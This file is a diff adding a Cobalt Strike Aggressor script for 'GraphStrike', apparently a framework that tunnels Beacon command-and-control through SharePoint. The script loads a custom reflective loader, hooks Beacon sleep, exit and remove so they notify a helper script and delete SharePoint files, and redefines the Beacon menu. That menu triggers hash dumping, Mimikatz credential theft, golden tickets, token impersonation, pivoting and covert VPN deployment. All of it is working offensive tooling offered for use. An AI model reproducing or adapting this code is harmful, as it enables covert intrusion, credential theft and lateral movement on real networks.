@@ -1,0 +1,261 @@
+$scriptDir = script_resource() . "/";
+$scriptPath = $scriptDir . "message.py";
+$teamserverIP = localip();
+
+set BEACON_RDLL_SIZE {
+   warn("Running 'BEACON_RDLL_SIZE' for DLL " . $1 . " with architecture " . $2);
+   return "100";
+}
+
+set BEACON_RDLL_GENERATE {
+	$smpath = $scriptDir . "GraphLdr." . $3 . ".bin";
+	$hnd = openf( $smpath );
+	$ldr = readb( $hnd, -1 );
+	closef( $hnd );
+
+	if ( strlen( $ldr ) == 0 ) {
+		return $null;
+	};
+	warn("Loading custom user defined reflective loader from: " . $smpath);
+		
+	return setup_transformations($ldr . $2, $3);
+};
+
+alias sleep {
+	local('$command');
+
+	$command = "cd $scriptDir && $scriptPath $teamserverIP sleep $1 $2 && cd -";
+
+	# Append instructions to command to redirect stderr to processStdout
+	$command = $command . " 2>&1";
+	
+	# Run command in a subshell to redirect stderr -> processStdout
+	$data = exec(@("/bin/sh", "-c", $command));
+
+	# We don't really need the output, but reading the data lets us block
+	# until the server has completed work before we issue Beacon commands.
+	$output = join("\n", readAll($data));
+
+	bsleep($1, $2, $3);
+}
+
+alias exit {
+	exitFunc($1);
+}
+
+sub exitFunc {
+	local('$command $beaconIds @bids $id $data $output')
+
+	# $1 gets passed in as different data types depending on how exit is called...
+	if (typeOf($1) eq "class sleep.engine.types.StringValue")
+	{
+		add(@bids, $1);
+	}
+	else if (typeOf($1) eq "class sleep.runtime.CollectionWrapper")
+	{
+		addAll(@bids, $1);
+	}
+
+	foreach $id (@bids)
+	{
+		$beaconIds = $beaconIds . " " . $id;
+	}
+
+	$command = "cd $scriptDir && $scriptPath $teamserverIP exit $beaconIds && cd -";
+
+	# Append instructions to command to redirect stderr to processStdout
+	$command = $command . " 2>&1";
+	
+	# Run command in a subshell to redirect stderr -> processStdout
+	$data = exec(@("/bin/sh", "-c", $command));
+
+	# We don't really need the output, but reading the data lets us block
+	# until the server has completed work before we issue Beacon commands.
+	$output = join("\n", readAll($data));
+
+	if (size(@bids) > 0)
+	{
+		foreach $id (@bids)
+		{
+			bexit($id);
+		}
+	}
+	else
+	{
+		bexit($1);
+	}
+}
+
+sub removeFunc {
+	local('$command $beaconIds @bids $id $data $output')
+
+	addAll(@bids, $1);
+	foreach $id (@bids)
+	{
+		$beaconIds = $beaconIds . " " . $id;
+	}
+
+	$command = "cd $scriptDir && $scriptPath $teamserverIP remove $beaconIds && cd -";
+
+	# Append instructions to command to redirect stderr to processStdout
+	$command = $command . " 2>&1";
+	
+	# Run command in a subshell to redirect stderr -> processStdout
+	$data = exec(@("/bin/sh", "-c", $command));
+
+	# We don't really need the output, but reading the data lets us block
+	# until the server has completed work before we issue Beacon commands.
+	$output = join("\n", readAll($data));
+	
+	foreach $id (@bids)
+	{
+		beacon_remove($id)
+	}
+}
+
+# Have to redefine the Beacon Popup Menu in order to integrate support for GraphStrike Server with exit and remove right-click options.
+# From: https://hstechdocs.helpsystems.com/kbfiles/cobaltstrike/attachments/default.cna
+# BEACON POPUP MENU START
+popup_clear("beacon");
+popup beacon {
+	item "&Interact" {
+		local('$bid');
+		foreach $bid ($1) {
+			openOrActivate($bid);
+		}
+	}
+	item "&Note..." {
+		# resolve the note attached to the first highlighted Beacon
+		local('$note');
+		$note = beacon_info($1[0], "note");
+
+		# prompt the user for a new note.
+		prompt_text("Set Beacon Note:", $note, lambda({
+			binput($bids, "note $1");
+			beacon_note($bids, $1);
+		}, $bids => $1));
+	}
+	separator();
+	insert_menu("beacon_top", $1);
+	menu "&Access" {
+		item "&Dump Hashes" {
+			local('$bid');
+			foreach $bid ($1) {
+				openOrActivate($bid);
+				binput($bid, "hashdump");
+				if (-isadmin $bid) {
+					bhashdump($bid);
+				}
+				else {
+					berror($bid, "this command requires administrator privileges");
+				}
+			}
+		}
+		item "&Elevate" { openElevateDialog($1); }
+		item "Golden &Ticket" {
+			local('$bid');
+			foreach $bid ($1) {
+				openGoldenTicketDialog($bid);
+			}
+		}
+		item "Make T&oken" {
+			local('$bid');
+			foreach $bid ($1) {
+				openMakeTokenDialog($bid);
+			}
+		}
+		item "&One-liner" {
+			openOneLinerDialog($1);
+		}
+		item "Run &Mimikatz" {
+			openOrActivate($1);
+			binput($1, "logonpasswords");
+			blogonpasswords($1);
+		}
+		item "&Spawn" {
+			openPayloadHelper(lambda({
+				binput($bids, "spawn $1");
+				bspawn($bids, $1);
+			}, $bids => $1));
+		}
+		item "Spawn &As"  {
+			local('$bid');
+			foreach $bid ($1) {
+				openSpawnAsDialog($bid);
+			}
+		}
+	}
+	menu "&Explore" {
+		item "&Browser Pivot" {
+			local('$bid');
+			foreach $bid ($1) {
+				openBrowserPivotSetup($bid);
+			}
+		}
+		item "&Desktop (VNC)" {
+			binput($1, "desktop");
+			bdesktop($1);
+		}
+		item "&File Browser" {
+			local('$bid');
+			foreach $bid ($1) {
+				openFileBrowser($bid);
+			}
+		}
+		item "&Net View" {
+			openOrActivate($1);
+			binput($1, "net view");
+			bnet($1, "view");
+		}
+		item "Port &Scan" {
+			local('$bid');
+			foreach $bid ($1) {
+				openPortScannerLocal($bid);
+			}
+		}
+		item "&Process List" { openProcessBrowser($1); }
+		item "S&creenshot" {
+			binput($1, "screenshot");
+			bscreenshot($1);
+		}
+	}
+	menu "&Pivoting" {
+		item "&SOCKS Server" {
+			local('$bid');
+			foreach $bid ($1) {
+				openSOCKSSetup($bid);
+			}
+		}
+		item "&Listener..." {
+			local('$bid');
+			foreach $bid ($1) {
+				openPivotListenerSetup($bid);
+			}
+		}
+		separator();
+		item "&Deploy VPN" {
+			local('$bid');
+			foreach $bid ($1) {
+				openCovertVPNSetup($bid);
+			}
+		}
+	}
+	insert_menu("beacon_bottom", $1);
+	separator();
+	menu "S&ession" {
+		menu "&Color" {
+			insert_component(colorPanel("beacons", $1));
+		}
+		item "&Remove" {
+			$bids = $1; 
+			prompt_confirm("Once a Beacon has been removed from the console, the corresponding files in SharePoint will also be deleted; Beacon can never call in again, even if you have not exited! Are you sure?",
+			"Confirm Removal",
+			 { removeFunc($bids); });
+		}
+		item "&Exit" {
+			binput($1, "exit");
+			exitFunc($1);
+		}
+	}
+}
+# BEACON POPUP MENU END
